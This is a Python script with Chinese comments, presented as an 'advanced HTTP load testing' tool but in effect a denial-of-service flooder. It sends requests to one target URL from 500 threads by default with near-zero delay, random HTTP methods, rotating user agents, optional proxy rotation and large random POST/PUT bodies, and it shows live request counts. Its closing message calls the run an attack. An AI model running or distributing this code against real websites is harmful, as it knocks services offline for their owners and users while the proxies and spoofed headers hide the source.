#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import random
import string
import time
import argparse
import sys
import logging

# --- 配置日志 ---
# 移除了所有 print 语句，改用日志记录，避免多线程输出混乱
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- ANSI 颜色代码 (用于美化终端输出) ---
C_RESET = "\033[0m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE = "\033[94m"

# --- 全局变量和同步原语 ---
stop_event = threading.Event()
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
]
methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']

# --- 统计数据 ---
request_count = 0
success_count = 0
error_count = 0
lock = threading.Lock()

def ascii_art():
    """显示带颜色的 ASCII LOGO。"""
    print(f"""{C_BLUE}
███████╗██████╗ ██╗  ██╗ ██████╗ ███████╗
██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔════╝
█████╗  ██████╔╝███████║██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══██║██║   ██║╚════██║
███████╗██║  ██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{C_RESET}""")

def generate_payload(min_size=5000, max_size=10000):
    """为 POST 和 PUT 请求生成随机数据负载。"""
    payload_size = random.randint(min_size, max_size)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))

def load_proxies(proxy_file):
    """从文件中加载代理列表。"""
    if not proxy_file:
        return []
    try:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            logging.warning("代理文件为空。")
            return []
        logging.info(f"成功从 {proxy_file} 加载 {len(proxies)} 个代理")
        return proxies
    except FileNotFoundError:
        logging.error(f"错误：代理文件 '{proxy_file}' 未找到。")
        sys.exit(1)
    except Exception as e:
        logging.error(f"读取代理文件时出错：{e}")
        sys.exit(1)

def send_request(target_url, delay, proxies):
    """循环发送 HTTP 请求。"""
    global request_count, success_count, error_count
    session = requests.Session()

    while not stop_event.is_set():
        headers = {'User-Agent': random.choice(user_agents)}
        request_type = random.choice(methods)
        
        # 如果有代理，则随机选择一个
        proxy = None
        if proxies:
            proxy_choice = random.choice(proxies)
            proxy = {'http': f'http://{proxy_choice}', 'https': f'https://{proxy_choice}'}

        try:
            data = None
            if request_type in ['POST', 'PUT']:
                data = generate_payload()

            # 使用 session.request 以支持所有请求方法
            response = session.request(request_type, target_url, data=data, headers=headers, proxies=proxy, timeout=5)

            with lock:
                request_count += 1
                if 200 <= response.status_code < 400:
                    success_count += 1
                else:
                    error_count += 1

        except requests.exceptions.RequestException:
            with lock:
                request_count += 1
                error_count += 1
        
        time.sleep(delay)

def display_stats(target_url, thread_count):
    """实时显示统计数据（无闪烁）。"""
    while not stop_event.is_set():
        # 使用 ANSI 转义码实现清屏和光标归位，以达到无闪烁刷新效果
        sys.stdout.write("\033[H\033[J")
        
        ascii_art()
        print("────────────────────────────────────────")
        print(f"🎯 目标  : {C_YELLOW}{target_url}{C_RESET}")
        print(f"🚀 线程数: {C_YELLOW}{thread_count}{C_RESET}")
        print("────────────────────────────────────────")
        
        with lock:
            print(f"📊 总请求: {C_BLUE}{request_count}{C_RESET}")
            print(f"✅ 成功  : {C_GREEN}{success_count}{C_RESET}")
            print(f"❌ 失败  : {C_RED}{error_count}{C_RESET}")
        
        print("────────────────────────────────────────")
        print(f"{C_YELLOW}按 Ctrl+C 停止...{C_RESET}")
        
        sys.stdout.flush()
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="高级 HTTP 负载测试脚本。")
    parser.add_argument("url", help="目标 URL。")
    parser.add_argument("-t", "--threads", type=int, default=500, help="并发线程数 (默认: 500)。")
    parser.add_argument("-d", "--delay", type=float, default=0.0005, help="每个线程发送请求的间隔时间 (秒) (默认: 0.0005)。")
    parser.add_argument("-p", "--proxies", type=str, help="代理文件路径 (每行一个 'ip:port')。")
    
    args = parser.parse_args()

    # 验证 URL 格式
    if not (args.url.startswith("http://") or args.url.startswith("https://")):
        logging.error("无效的 URL。必须以 'http://' 或 'https://' 开头。")
        sys.exit(1)

    proxy_list = load_proxies(args.proxies)

    print(f"\n{C_GREEN}🚀 启动负载测试...{C_RESET}")
    print(f"   URL   : {args.url}")
    print(f"   线程数 : {args.threads}")
    print(f"   代理  : {'是' if proxy_list else '否'}")
    time.sleep(2)

    stats_thread = threading.Thread(target=display_stats, args=(args.url, args.threads), daemon=True)
    stats_thread.start()

    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=send_request, args=(args.url, args.delay, proxy_list), daemon=True)
        threads.append(thread)
        thread.start()

    try:
        # 等待所有线程完成（实际上是无限循环，直到被中断）
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"\n\n{C_YELLOW}🛑 收到停止信号，正在终止所有线程...{C_RESET}")
        stop_event.set()
        time.sleep(1) # 给线程一点时间来响应停止事件
        print(f"{C_GREEN}✅ 攻击已停止！{C_RESET}")

if __name__ == "__main__":
    main()
